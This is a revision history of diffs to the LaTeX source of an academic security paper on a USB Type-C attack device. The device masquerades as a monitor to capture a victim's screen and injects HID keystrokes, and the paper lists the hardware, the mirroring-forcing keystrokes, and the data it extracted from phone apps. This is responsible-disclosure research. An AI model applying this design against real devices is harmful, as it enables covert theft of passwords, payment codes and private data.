+\circled[text=white,fill=myblue]{\scriptsize{A}} is a HUAWEI mobile phone, the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the \ac{USB} 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the \ac{HID} Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
@@
 	\item \textbf{Screen Mirror}:
-		During our experiment, we noticed that some devices do not mirror their screen to our \tool by default.
-In this case, \tool will inject a sequence of keystrokes to set the victim's device into mirror their screen.
-In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' multiple times to switch between different modes for external display.
+		During our experiment, we noticed that some devices did not mirror their screens to our \tool by default.
+In this case, \tool would inject a sequence of keystrokes to set the victim's device into mirror their screens.
+In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' to switch between different modes for external display.
 In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{`Command+F1'} keystroke to set the monitor into mirroring the primary screen.
@@
 For example, in Ubuntu, if the default setting is to disable external screen, \tool needs to press `Win+P' four times while if the default setting is to extend the primary screen, \tool needs to press `Win+P' five times.
+In EMUI, there is a special mode called `Desktop Mode', which allows users to use their smartphones like a desktop computer with an external screen.
+If this mode is victim's default setting, \tool can inject mouse movements to switch to mirror mode as \tool can obtain victim's `desktop' in this mode.
 	\item \textbf{Dismiss Notification}:
@@
 		 \item On Lenovo Xiaoxin Pro 13, it raised a pop-up asking user to select the functionality of the external screen. 
-		 \item On Huawei P30, it showed a status bar indicator and a persistent notification about the external monitor.
+		 \item On HUAWEI P30, it showed a status bar indicator and a persistent notification about the external monitor.
 		 \item On iPad Pro (the third generation), it also showed a blue status bar indicator and a notification about \ac{USB} accessories if iPad is locked.
@@
 
-During the experiment of privacy extraction via our video capture mode, we chose \textit{HUAWEI P30 (ELE-AL00)}, a
-smartphone in EMUI 11.0.0.135(C00E128R2P5) \mbox{(Android 10.0 based)} with a \ac{USB} Type-C interface, as the
+During the experiment of privacy extraction via our video capture mode, we chose \mbox{\textit{HUAWEI P30 (ELE-AL00)}}, a
+smartphone in \mbox{EMUI 11.0.0.135(C00E128R2P5)} \mbox{(Android 10.0 based)} with a \ac{USB} Type-C interface, as the
 target device. In the privacy extraction experiment, \tool passively captured video
@@
 an attacker to identify payment code in the video stream and performs transactions
-without the password. As this is also a part of our case study, more details about
+without the password. During our experiment, we noticed that this HUAWEI device supports `Desktop Mode' 
+for its external screen, which enables user to use their devices like a desktop computer with a external screen.
+If \tool is set into this mode, \tool is able to inject mouse movements to set itself into mirroring the primary screen, as we discussed in Section~\ref{subsec:attack_init}.
+As this is also a part of our case study, more details about
 the extracted sensitive data can be found in Section~\ref{subsec:case_study} and

### 2021-03-17 WOOT/Files/discussion.tex
limitation and mode switch

@@
 There exist multiple limitations of \tool. To begin with, when \tool is attached, the victim's device may not be set to mirror the screen. 
-Depending on the victim's settings, the \tool may be used as an extended monitor or not be enabled at all.
-Additionally, some smartphone vendors (e.g.
-Huawei and Smartisan) provide a Desktop Mode to users, which displays a desktop on external screen instead of mirroring.
+Depending on the victim's settings, the \tool may be used as an extended monitor or be set to `Desktop Mode' or not be enabled at all.
+Though we proposed the attack initialization in Section~\ref{subsec:attack_init} to inject keystrokes to ensure \tool is mirroring primary screen.
+But without knowing the exact operating system of the victim's device, \tool may have to try multiple injections before successfully mirroring.
 Moreover, as mentioned in Section~\ref{sec:experiment}, \tool cannot directly obtain the information on the lock screen.
-In these cases, \tool is either easily noticeable to the victim or disabled.
  Apart from that, we also noticed that in most devices, when an external monitor is connected to the device, there will be notifications about the monitor.
@@
 When selecting devices to test \tool, we find that many smartphones equipped with USB-C connectors actually do not support \ac{USB} 3.x protocol.
-There is a incomplete list of devices that support DisplayPort over \ac{USB}~\cite{usbclist} Most vendors like Huawei and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones.
+There is a incomplete list of devices that support DisplayPort over \ac{USB}~\cite{usbclist}.
+Most vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones.
 But there also exists vendor like Xiaomi who does not support \ac{USB} 3.x protocol at all.

### 2021-03-17 WOOT/Files/experiment.tex

@@
 In this case, \tool would inject a sequence of keystrokes to set the victim's device into mirror their screens.
-In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' to switch between different modes for external display.
+In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' (`Super' is another name for `Win' key) to switch between different modes for external display.
+Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and Windows 10 is similar to Ubuntu.
 In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{`Command+F1'} keystroke to set the monitor into mirroring the primary screen.
-However, if the victim has default setting for external monitor display mode, \tool will have to try these keystroke repeatedly to set itself into mirroring the victim's screen.
-For example, in Ubuntu, if the default setting is to disable external screen, \tool needs to press `Win+P' four times while if the default setting is to extend the primary screen, \tool needs to press `Win+P' five times.
+\tool needs to press `Win+P' five times.
 In EMUI, there is a special mode called `Desktop Mode', which allows users to use their smartphones like a desktop computer with an external screen.
 If this mode is victim's default setting, \tool can inject mouse movements to switch to mirror mode as \tool can obtain victim's `desktop' in this mode.
+		\begin{figure}[H]
+			\includegraphics[width=\linewidth]{./Figs/ubuntu_switch.png}\\	
+			\caption{Screen Mode Switch in Ubuntu.}
+			\label{fig:ubuntu_switch}
+		\end{figure}
 	\item \textbf{Dismiss Notification}:

### 2021-03-17 WOOT/Files/experiment.tex
change figure for mode switch

@@
 In this case, \tool would inject a sequence of keystrokes to set the victim's device into mirror their screens.
-In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' (`Super' is another name for `Win' key) to switch between different modes for external display.
-Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and Windows 10 is similar to Ubuntu.
+In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' (`Super' is another name for the `Win' key) to switch between different modes for external display.
+Figure~\ref{fig:ubuntu_switch} illustrates how these keystrokes works on Ubuntu and Windows 10 is similar.
 In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{`Command+F1'} keystroke to set the monitor into mirroring the primary screen.
-\tool needs to press `Win+P' five times.
 In EMUI, there is a special mode called `Desktop Mode', which allows users to use their smartphones like a desktop computer with an external screen.

### 2021-03-18 WOOT/Files/experiment.tex
say goodbye to the user study
🚧

@@
 
-\begin{table*}[t]
-	\centering
-	\begin{tabular}{|l|l|l|l|}
-		\hline
-		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbf{Frame Number} \\ \hline
-		username                          & X 8B cas.******.edu.cn Username: 11****18 Password:                                        & \textless{}user1\textgreater{} & 385                                    \\ \hline
-		username                          & Login Weibo Login with SMS and verification code ......
-+86 151****4587                    & \textless{}user5\textgreater{} & 1947                                   \\ \hline
-		username                          & QQ 14*****50| Login with phone number New user registration 2345678 9 0                    & \textless{}user3\textgreater{} & 4308                                   \\ \hline
-		username                          & connect to *** username h*****l Save account information Open VPN.....
-& \textless{}user6\textgreater{} & 7925                                   \\ \hline
-		phone number                      & Login with phone number ......
-+86 186****2483 |                                           & \textless{}user1\textgreater{} & 313                                    \\ \hline
-		phone number                      & Log in with your mobile phone number. ...... mobile phone number 131****9310 & \textless{}user9\textgreater{} & 210                                    \\ \hline
-		@                                 & contact email 30*******7G@qq.com, contact phone 027-88******                               & \textless{}user7\textgreater{} & 5324                                   \\ \hline
-		@                                 & Account 73*****5@qq.com @qq.com @163.com @gmail.com 	......      & \textless{}user6\textgreater{} & 621                                    \\ \hline
-	\end{tabular}
-	\linebreak
-	\caption{Examples of Searching \ac{OCR} Results with Keywords.}
-	\label{tab:ocr_keyword_example}
-\end{table*}
-
-\begin{table*}[t]
-	\centering
-	\begin{tabular}{|c|c|c|c|c|c|c|}
-		\hline
-		\textbf{Keyword}                               & Account & Password & Phone number & Email & Username & Regexp for email~  \\
-		\hline
-		\textbf{Number of records containing keywords} & 680     & 1,596     & 1,510         & 164   & 522      & 78                 \\
-		\hline
-		\textbf{Total Number of Records} & \multicolumn{6}{c|}{4,172} \\
-		\hline
-	\end{tabular}
-	\linebreak
-	\caption{Privacy Extraction Result.}
-	\label{table:information_extracted}
-\end{table*}
-
 We first introduce the technical background of our case study, sharing power
@@
 
+We notice that, with \tool, the attacker can view any victim's information that does not require authentication with video capture mode or full control mode.
+However, the information that requires authentication can only be obtained with video capture mode after the victim's authentication.
+To further validate our attacking scenario, we conduct a experiment to find out what types of sensitive information are protected by default.
+We install x applications on an Android phone, setup each application with the strategy that
+\ding{182} Login in with a test account.
+\ding{183} Keep the default settings.
+\ding{184} Agree to it when it asks to enable authentication before accessing private data.
+
+\subsubsection{Result}
+
+In summary, though we cannot directly obtain the user's password on the lock screen, we can still check all of the information presented on the screen, extract sensitive information including but not limited to social accounts, bank accounts, personal financial situation, if the user unconsciously unlocks the screen.
+It is worth mentioning that {secure keyboards} built in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
+
+\begin{table*}[t]
+	\centering
+	\begin{tabular}{|c|c|c|c|c|c|}
+		\hline
+		\textbf{Category}  					& \textbf{Application} & \textbf{Leaked Sensitive Information}    & \textbf{Leaked Sensitive Information after Authentication} \\
+		\hline
+		Social \& Finance App 				& WeChat      & WeChat account, Asset status, chat history    & \\
+		\hline
+		\multirow{3}{*}{Social App}			& QQ          & QQ account, interpersonal nexus, chat history   & \\
+											\cline{2-4}
+							       			& Twitter     & Twitter account, interpersonal nexus            & \\
+											\cline{2-4}
+							       			& Gmail       & Gmail account, Mail records                     & \\
+		\hline
+		\multirow{3}{*}{Finance App}       	& Alipay      & Alipay account, Asset status         			& \\
+											\cline{2-4}
+											& ICBC        & ICBC account, password, Asset status  			& \\
+											\cline{2-4}
+											& Paypal      & Paypal account, bank accounts, Asset status     & \\
+		\hline
+		Tool                & Chrome      & Sites visited                                   & \\
+		\hline
+		Tool                & Health      & Personal physical metrics      					& \\
+		\hline
+	\end{tabular}
+	\linebreak
+	\caption{Information Extraction via Manual Analysis.}
+	\label{table:information_extracted}
+\end{table*}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% It is unfortunate that the user study is not part of the paper anymore.
+\iffalse
+
 To further validate our attacking scenario, we invited 10 volunteers, who are students in our university, to participate and conduct a user study.
@@
 It is worth mentioning that {secure keyboards} built in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
+
+\begin{table*}[t]
+	\centering
+	\begin{tabular}{|l|l|l|l|}
+		\hline
+		\textbf{Keyword} & \textbf{Text}                                                             & \textbf{Name}                                   & \textbf{Frame Number} \\ \hline
+		username                          & X 8B cas.******.edu.cn Username: 11****18 Password:                                        & \textless{}user1\textgreater{} & 385                                    \\ \hline
+		username                          & Login Weibo Login with SMS and verification code ......
++86 151****4587                    & \textless{}user5\textgreater{} & 1947                                   \\ \hline
+		username                          & QQ 14*****50| Login with phone number New user registration 2345678 9 0                    & \textless{}user3\textgreater{} & 4308                                   \\ \hline
+		username                          & connect to *** username h*****l Save account information Open VPN.....
+& \textless{}user6\textgreater{} & 7925                                   \\ \hline
+		phone number                      & Login with phone number ......
++86 186****2483 |                                           & \textless{}user1\textgreater{} & 313                                    \\ \hline
+		phone number                      & Log in with your mobile phone number. ...... mobile phone number 131****9310 & \textless{}user9\textgreater{} & 210                                    \\ \hline
+		@                                 & contact email 30*******7G@qq.com, contact phone 027-88******                               & \textless{}user7\textgreater{} & 5324                                   \\ \hline
+		@                                 & Account 73*****5@qq.com @qq.com @163.com @gmail.com 	......      & \textless{}user6\textgreater{} & 621                                    \\ \hline
+	\end{tabular}
+	\linebreak
+	\caption{Examples of Searching \ac{OCR} Results with Keywords.}
+	\label{tab:ocr_keyword_example}
+\end{table*}
+
+\begin{table*}[t]
+	\centering
+	\begin{tabular}{|c|c|c|c|c|c|c|}
+		\hline
+		\textbf{Keyword}                               & Account & Password & Phone number & Email & Username & Regexp for email~  \\
+		\hline
+		\textbf{Number of records containing keywords} & 680     & 1,596     & 1,510         & 164   & 522      & 78                 \\
+		\hline
+		\textbf{Total Number of Records} & \multicolumn{6}{c|}{4,172} \\
+		\hline
+	\end{tabular}
+	\linebreak
+	\caption{Privacy Extraction Result.}
+	\label{table:information_extracted}
+\end{table*}
+
+\fi

### 2021-03-18 WOOT/Files/experiment.tex
🚧

@@
 However, the information that requires authentication can only be obtained with video capture mode after the victim's authentication.
-To further validate our attacking scenario, we conduct a experiment to find out what types of sensitive information are protected by default.
-We install x applications on an Android phone, setup each application with the strategy that
-\ding{182} Login in with a test account.
-\ding{183} Keep the default settings.
-\ding{184} Agree to it when it asks to enable authentication before accessing private data.
+To further validate our attacking scenario, we conduct an experiment to find out what types of sensitive information are protected by default.
+We installed x applications on an Android phone, set up each application with the strategy that
+\ding{182} Login in with a test account,
+\ding{183} Keep the default settings,
+\ding{184} Agree to it when it asks to enable authentication before accessing private data, then
+recorded all information shown in applications with or without authentication. The result is shown in the Table~\ref{table:information_extracted}.
+
+However, if the victim uses a password instead of biometric authentication, the password can be leaked out and cause greater harm, such as guessing other passwords on the device.
+As the victim uses the device and accesses information, the possibility of the leakage of information that needs authentication would increase, and this kind of information often brings greater risk such as hacking accounts.
+Meanwhile, the leakage of the information that can be obtained without authentication is enough to bring potential risk to the victim, such as misappropriating the victim's payment code, using the victim's personal information for illegal crimes.
 
@@
 In summary, though we cannot directly obtain the user's password on the lock screen, we can still check all of the information presented on the screen, extract sensitive information including but not limited to social accounts, bank accounts, personal financial situation, if the user unconsciously unlocks the screen.
+The information that requires authentication is still safer than the information that does not require authentication.
+The attacker can not directly obtain this kind of information aggressively through the full control mode.
 It is worth mentioning that {secure keyboards} built in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
@@
 		\hline
-		Tool                & Chrome      & Sites visited                                   & \\
+		\multirow{2}{*}{Tool}               & Chrome      & Sites visited                                   	& \\
+											\cline{2-4}
+		                					& Health      & Personal physical metrics      						& \\
 		\hline
-		Tool                & Health      & Personal physical metrics      					& \\
+		\multirow{2}{*}{System}             & Settings - WiFi   & WiFi SSID                                	&  WiFi password \\
+											\cline{2-4}
+		                					& Settings - VPN    & VPN address, VPN account, VPN password      						& \\
 		\hline

### 2021-03-18 WOOT/Files/experiment.tex
🚧

@@
 \ding{184} Agree to it when it asks to enable authentication before accessing private data, then
-recorded all information shown in applications with or without authentication. The result is shown in the Table~\ref{table:information_extracted}.
+recorded all information shown in applications with or without authentication.
 
-However, if the victim uses a password instead of biometric authentication, the password can be leaked out and cause greater harm, such as guessing other passwords on the device.
+As the result shown in the Table~\ref{table:information_extracted}, if the victim uses a password instead of biometric authentication, the password can be leaked out and cause greater harm, such as guessing other passwords on the device.
 As the victim uses the device and accesses information, the possibility of the leakage of information that needs authentication would increase, and this kind of information often brings greater risk such as hacking accounts.

### 2021-03-18 WOOT/Files/experiment.tex
🚧

@@
 		\hline
-		Social \& Finance App 				& WeChat      & WeChat account, Asset status, chat history    		& \\
+		Social \& Finance App 				& WeChat      & Account, Asset status, Chat History, Payment Code   & \\
 		\hline
-		\multirow{3}{*}{Social App}			& QQ          & QQ account, interpersonal nexus, chat history   	& \\
+		\multirow{3}{*}{Social App}
+											%& QQ          & Account, Interpersonal Nexus, Chat History   	& \\
+											%\cline{2-4}
+							       			& WhatsApp    & Account, Interpersonal Nexus, Chat History, Phone Number           	& \\
 											\cline{2-4}
-							       			& Twitter     & Twitter account, interpersonal nexus            	& \\
+							       			& Facebook    & Account, Posts, Interpersonal Nexus, Contact Info                     	& \\
+		\hline
+		\multirow{3}{*}{Finance App}       	& Alipay      & Account, Asset status, Payment Code         				& \\
 											\cline{2-4}
-							       			& Gmail       & Gmail account, Mail records                     	& \\
+											& Cash App    & Email, Phone Number, Cash Balance			& \\
+											\cline{2-4}
+											& Paypal      & Account, PayPal Balance     				& \\
 		\hline
-		\multirow{3}{*}{Finance App}       	& Alipay      & Alipay account, Asset status         				& \\
+		\multirow{1}{*}{Shopping App}		& Amazon Shopping  & Account, Orders, Shopping Cart         & \\
+											%\cline{2-4}
+		                					%& Taobao      & Personal physical metrics      						& \\
+		\hline
+		\multirow{2}{*}{Tool}               & Chrome      & Browsing History                                	& \\
 											\cline{2-4}
-											& ICBC        & ICBC account, password, Asset status  				& \\
+		                					& Health      & Personal Physical Metrics      						& \\
+		\hline
+		\multirow{2}{*}{System}             & Contacts    &                                 	&  WiFi password \\
 											\cline{2-4}
-											& Paypal      & Paypal account, bank accounts, Asset status     	& \\
-		\hline
-		\multirow{2}{*}{Tool}               & Chrome      & Sites visited                                   	& \\
-											\cline{2-4}
-		                					& Health      & Personal physical metrics      						& \\
-		\hline
-		\multirow{2}{*}{System}             & Settings - WiFi   & WiFi SSID                                	&  WiFi password \\
+											& Settings - WiFi   & WiFi SSID                                	&  WiFi password \\
 											\cline{2-4}
@@
 	\linebreak
-	\caption{Information Extraction via Manual Analysis.}
+	\caption{Information Extraction.}
 	\label{table:information_extracted}

### 2021-03-18 WOOT/Files/experiment.tex
experiment revised

@@
 To further validate our attacking scenario, we conduct an experiment to find out what types of sensitive information are protected by default.
-We installed x applications on an Android phone, set up each application with the strategy that
+We selected 11 applications on Android, set up each application with the strategy that
+\yechang{Application version....????}
 \ding{182} Login in with a test account,
 \ding{183} Keep the default settings,
-\ding{184} Agree to it when it asks to enable authentication before accessing private data, then
-recorded all information shown in applications with or without authentication.
+\ding{184} Agree to it when it asks to enable authentication before accessing private data,
+then recorded all information shown in applications with or without authentication.
+It is worth mentioning that {secure keyboards} built-in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
 
-As the result shown in the Table~\ref{table:information_extracted}, if the victim uses a password instead of biometric authentication, the password can be leaked out and cause greater harm, such as guessing other passwords on the device.
-As the victim uses the device and accesses information, the possibility of the leakage of information that needs authentication would increase, and this kind of information often brings greater risk such as hacking accounts.
-Meanwhile, the leakage of the information that can be obtained without authentication is enough to bring potential risk to the victim, such as misappropriating the victim's payment code, using the victim's personal information for illegal crimes.
+As the result shown in Table~\ref{table:information_extracted}, most payment applications use in-app authentication to ensure payment security but biometric authentication is not enabled by default.
+If the victim uses a password instead of biometric authentication, the password can be leaked out and used to guess screen unlock passcode or hack accounts, which threats the victim's property.
+And the leakage of the information that can be obtained without authentication is sufficient to bring potential risk to the victim, such as misappropriating the victim's payment code, using the victim's personal information for illegal crimes.
 
@@
 
-In summary, though we cannot directly obtain the user's password on the lock screen, we can still check all of the information presented on the screen, extract sensitive information including but not limited to social accounts, bank accounts, personal financial situation, if the user unconsciously unlocks the screen.
-The information that requires authentication is still safer than the information that does not require authentication.
+In summary, if the user unconsciously unlocks the screen and visits corresponding applications, we can still view all of the information presented on the screen, extract sensitive information including but not limited to social accounts, bank accounts, personal property status.
+The information that requires authentication is safer than the information that does not require authentication.
 The attacker can not directly obtain this kind of information aggressively through the full control mode.
-It is worth mentioning that {secure keyboards} built in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
+But the possibility of the leakage of information that needs authentication would increase as the victim uses the device.
 
@@
 		\hline
-		\textbf{Category}  					& \textbf{Application} & \textbf{Leaked Sensitive Information}		& \textbf{Leaked Sensitive Information after Authentication} \\
+		\multirow{2}{*}{\textbf{Category} } & \multirow{2}{*}{ \textbf{Application} } & \multicolumn{2}{c|}{\textbf{Leaked Sensitive Information}} \\
+															\cline{3-4}
+											&				& \textbf{Without Authentication}						& \textbf{With Authentication} \\
 		\hline
-		Social \& Finance App 				& WeChat      & Account, Asset status, Chat History, Payment Code   & \\
+		Social \& Finance App 				& WeChat      & Account, Property Status, Chat History, Payment Code   		& Payment Password \\
 		\hline
@@
 		\hline
-		\multirow{3}{*}{Finance App}       	& Alipay      & Account, Asset status, Payment Code         				& \\
+		\multirow{3}{*}{Finance App}       	& Alipay      & Account, Property Status, Payment Code         				& Payment Password \\
 											\cline{2-4}
-											& Cash App    & Email, Phone Number, Cash Balance			& \\
+											& Cash App    & Email, Phone Number, Cash Balance							& Payment Password \\
 											\cline{2-4}
-											& Paypal      & Account, PayPal Balance     				& \\
+											& Paypal      & Account, PayPal Balance     								& Payment Password \\
 		\hline
@@
 		\hline
-		\multirow{2}{*}{System}             & Contacts    &                                 	&  WiFi password \\
+		\multirow{2}{*}{System}             &  Messages   & Interpersonal Nexus, Chat History, Contacts' Phone Number &   \\
 											\cline{2-4}
@@
 	\linebreak
-	\caption{Information Extraction.}
+	\caption{Sensitive Information Leaked From Applications.}
 	\label{table:information_extracted}

### 2021-03-19 WOOT/Files/badusb.tex
Grammar and sentences

@@
 Many of these take advantage of the \textit{trust-by-default} policy of PC,
-pretend to be normal \ac{HID} devices and utilize \ac{USB} protocol to perform attacks.
+pretend to be normal \ac{HID} devices and utilize the \ac{USB} protocol to perform attacks.
 However, these attacks suffer from various drawbacks: \ding{182} attackers can
@@
 attacks.
-However, we still unable to bypass defenses like GoodUSB~\cite{tian2015defending}, which completely blocks unauthorized functionality.
+However, we are still unable to bypass defenses like GoodUSB~\cite{tian2015defending}, which completely blocks unauthorized functionality.
 This will be further discussed in Section~\ref{sec:discussion}
@@
 
-	\item\underline{Single Board Computer} processes video stream from the victim via the Video Capture Card or sends commands to the victim via \ac{HID} Emulator.
+	\item\underline{Single Board Computer} processes the video stream from the victim via the Video Capture Card or sends commands to the victim via \ac{HID} Emulator.
 
@@
 The victim's device mistakenly treats \tool as an external monitor
-and output its video stream. This stream is latter processed by the embedded
+and output its video stream. This stream is later processed by the embedded
 computer to extract sensitive data.

### 2021-03-19 WOOT/Files/experiment.tex
Grammar and sentences

@@
 with \ac{USB} protocol support, which is able to emulate multiple \acp{HID}
-with our modified firmware. About the \ac{USB} 3.x Hub, we use one from the
+with our modified firmware. About the \ac{USB} 3.x Hub, we use one from 
 UGREEN~\cite{ugreen}, which supports HDMI, \ac{USB} 2.0, and many other exported peripherals.
@@
 \label{subsec:attack_init}
-After the \tool is plugged into the victim's device, there is an initialization process to make sure the \tool is able to carry out subsequent attack.
+After the \tool is plugged into the victim's device, there is an initialization process to make sure the \tool is able to carry out subsequent attacks.
 \begin{itemize}
@@
 In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
-2020}, a PC in Windows 10 \mbox{(OS Build 18363.1379)} and Ubuntu 20.04.2 LTS with two \ac{USB} Type-C interfaces as the
+2020}, a PC with Windows 10 \mbox{(OS Build 18363.1379)} and Ubuntu 20.04.2 LTS with two \ac{USB} Type-C interfaces as the
 target device.
@@
 To test the capability of the full control mode, we chose iPad Pro (3rd
-	generation), a tablet in iOS 14.4 (Build 18D52) with a \ac{USB} Type-C interface, as the target
+	generation), a tablet running iOS 14.4 (Build 18D52) with a \ac{USB} Type-C interface, as the target
 device in this experiment.  Besides disguising as normal \acp{HID} like a

### 2021-03-19 WOOT/Files/related_work.tex
Grammar and sentences

@@
 with the connected \ac{USB} devices as an RF transmitter and USBKiller\cite{usbkiller}
-inject analog
+injects analog
 power to cause physical damage to the host machine. Even though the data,
@@
 To solve this flaw, GoodUSB~\cite{tian2015defending} reports the functionality claimed
-by the device to the user and let the user decide whether to authorize. When a device
+by the device to the user and lets the user decide whether to authorize. When a device
 is plugged in, GoodUSB blocks its functionality before enumeration until a
@@
 BadUSB. In this case, the malicious device can only inject keystrokes in a very
-short time to reduce the risk of being discovered. This defect causes the
+short time to reduce the risk of being discovered. 
+This property causes the
 typing characteristics of BadUSB to be detectable. Pham \emph{et al.}~\cite{pham2010optimizing} optimize Windows security features, which can
@@
 exists an attack called JFA~\cite{JFC} which abuses the \ac{MHL}
-standard to steal video stream from the victim. In order to mitigate this
+standard to steal the video stream from the victim. In order to mitigate this
 issue, Meng et al.~\cite{meng2018252} propose a statistical model using status

### 2021-03-19 WOOT/BadUSBC.tex
remove of user study, revise comparison with JFA, revise of newly added real scenario emulation

@@
     utilizing \ac{USB} Type-C.  To validate the usability and effectiveness, we
-    conducted extensive experiments and a user study on a real-life attack
-    scenario.  Ten volunteers participated. 4,172 of 94,058 records
-    obtained by \tool in the user study are related to sensitive information.
+    conducted extensive experiments to simulate daily usage and summarized the private information collected.
 %\fengwei{What results?} \fengwei{what countermeasures do we propose? including

### 2021-03-19 WOOT/Files/conclusion.tex
remove of user study, revise comparison with JFA, revise of newly added real scenario emulation

@@
 has its own strength and use scenarios. The \ac{HID} Emulation mode largely extends the
-original BadUSB. The video capture mode proved practical and powerful in the user study, as it extracts
+original BadUSB. The video capture mode proved practical and powerful, as it extracts
 victim's sensitive information in a stealthy way. The fully control mode
@@
 We are actively facilitating their mitigating process and waiting for mitigation to be deployed.
+After the mitigation is deployed, HUAWEI will apply a CVE ID for this vulnerability.

### 2021-03-19 WOOT/Files/experiment.tex
remove of user study, revise comparison with JFA, revise of newly added real scenario emulation

--- 2021-03-18 WOOT/Files/experiment.tex
@@
 
-We notice that, with \tool, the attacker can view any victim's information that does not require authentication with video capture mode or full control mode.
-However, the information that requires authentication can only be obtained with video capture mode after the victim's authentication.
-To further validate our attacking scenario, we conduct an experiment to find out what types of sensitive information are protected by default.
-We selected 11 applications on Android, set up each application with the strategy that
-\yechang{Application version....????}
-\ding{182} Login in with a test account,
-\ding{183} Keep the default settings,
-\ding{184} Agree to it when it asks to enable authentication before accessing private data,
-then recorded all information shown in applications with or without authentication.
-It is worth mentioning that {secure keyboards} built-in financial apps show their keyboard typing sequences, which can be easily captured by \tool.
+To further validate our attacking scenario, we conducted an experiment to simulate a real-world attack scenario.
+We selected 11 applications on  \mbox{\textit{HUAWEI P30 (ELE-AL00)}}, test each application with the following strategy
+\ding{182} Attach \tool to the test device.
+\ding{183} Login in with a test account.
+\ding{184} Keep the default settings.
+\ding{185} Simulate daily usage of the application.
 
-As the result shown in Table~\ref{table:information_extracted}, most payment applications use in-app authentication to ensure payment security but biometric authentication is not enabled by default.
-If the victim uses a password instead of biometric authentication, the password can be leaked out and used to guess screen unlock passcode or hack accounts, which threats the victim's property.
-And the leakage of the information that can be obtained without authentication is sufficient to bring potential risk to the victim, such as misappropriating the victim's payment code, using the victim's personal information for illegal crimes.
+During this experiment, we first tested full control mode which actively gathered sensitive information, then tested video capture mode which passively collected the sensitive information visited by victims.
+We noticed that, most sensitive information could be gathered directly through full control mode without victim's interaction, but there was also certain information that had to be collected passively through video capture mode.
+For example, as illustrated in Table~\ref{table:information_extracted}, in most applications, information like `Account' can be gathered directly while information like `Payment Password' cannot be collected until the victim inputs his/her password.
 
 \subsubsection{Result}
-
-In summary, if the user unconsciously unlocks the screen and visits corresponding applications, we can still view all of the information presented on the screen, extract sensitive information including but not limited to social accounts, bank accounts, personal property status.
-The information that requires authentication is safer than the information that does not require authentication.
-The attacker can not directly obtain this kind of information aggressively through the full control mode.
-But the possibility of the leakage of information that needs authentication would increase as the victim uses the device.
+In summary, as shown in Table~\ref{table:information_extracted}, our \tool is able to actively gather most sensitive information such as browsing history, personal account, phone number without victim's interaction.
+There also exists information such as payment password that is not available immediately, but such a piece of information can be collected once the victim input it on his/her smartphone.
+The gathered information can be further used to deduce victim's lock screen password and poses even greater threat to victim's privacy.
 
@@
 	\centering
-	\begin{tabular}{|c|c|c|c|c|c|}
+	\begin{tabular}{|c|c|l|l|c|c|}
 		\hline
@@
 											\cline{2-4}
-		                					& Health      & Personal Physical Metrics      						& \\
+		                					& Health      & Personal Health Metrics      						& \\
 		\hline
@@
 											\cline{2-4}
-											& Settings - WiFi   & WiFi SSID                                	&  WiFi password \\
+											& Settings - WiFi   & WiFi SSID                                	&  WiFi Password \\
 											\cline{2-4}
-		                					& Settings - VPN    & VPN address, VPN account, VPN password      						& \\
+		                					& Settings - VPN    & VPN Address, VPN Account, VPN Password      						& \\
 		\hline

### 2021-03-19 WOOT/Files/related_work.tex
remove of user study, revise comparison with JFA, revise of newly added real scenario emulation

--- 2021-03-17 WOOT/Files/related_work.tex
@@
 JFA~\cite{JFC}, short for Juice Filming Attacks,
-abuses this standard and monitoring victim's device utilizing \ac{USB} 2.0 protocol. Although JFA~\cite{JFC} could  exfiltrates video data from the victim without permission,  
+abuses this standard and monitoring victim's device utilizing \ac{USB} 2.0 protocol. Although the JFA~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
 there are two main limitation compared with \tool: 
-\ding{183} JFA~\cite{JFC} can only exfiltrate video data under from victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
-For example, when the victim forgets to lock the screen of his/her device, JFA can only captrue the static screen of the victim's device.
-However \tool can open the payment application by mouse, exfiltrate the payment QR code, and steal money by scanning the payment QR code.
-\ding{182} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest devices supporting \ac{MHL} are released in 2015, a lack of support of \ac{MHL} limits the capabilities of JFA.
+\ding{182} JFA~\cite{JFC} can only exfiltrate video data passively from the victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
+All data can be collected by JFA only after the victim's interaction, while \tool can gather sensitive data actively through \ac{HID} injection.
+For example, if the victim leaves his/her phone charging without locking it, the JFA cannot obtain anything in this case, while \tool can actively control victim's device and gather sensitive information.
+\ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest devices supporting \ac{MHL} were released in 2015, which indicates the lack of support of \ac{MHL} and limits the attack range of JFA.
